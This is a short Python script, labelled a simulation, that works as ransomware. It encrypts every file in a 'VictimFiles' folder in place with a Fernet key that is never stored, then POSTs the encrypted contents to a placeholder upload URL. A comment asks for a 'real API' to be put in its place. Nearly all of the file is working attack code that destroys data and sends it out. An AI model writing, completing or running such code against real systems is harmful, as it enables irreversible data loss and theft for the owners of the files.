import os
import requests
from cryptography.fernet import Fernet
from datetime import datetime

VICTIM_FOLDER = "./VictimFiles"
LOG_FILE = "./malware_log.txt"

# Placeholder API — You will give me your real API!
API_URL = "https://example.com/api/upload"

# Generate encryption key (simulation)
key = Fernet.generate_key()
cipher = Fernet(key)

def log(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} — {message}\n")

log("Simulation started!")

for filename in os.listdir(VICTIM_FOLDER):
    file_path = os.path.join(VICTIM_FOLDER, filename)

    if os.path.isfile(file_path):
        with open(file_path, "r") as file:
            data = file.read()

        # Encrypt file content
        encrypted_data = cipher.encrypt(data.encode())
        with open(file_path, "wb") as file:
            file.write(encrypted_data)

        log(f"Encrypted file: {filename}")

        # Send encrypted data
        try:
            response = requests.post(API_URL, json={
                "filename": filename,
                "content": encrypted_data.decode()
            })
            log(f"Transfer success: {filename}")
        except Exception as e:
            log(f"Transfer FAILED: {filename} — {str(e)}")

log("Simulation Finished")
print("Files Encrypted + Transfer Attempted")
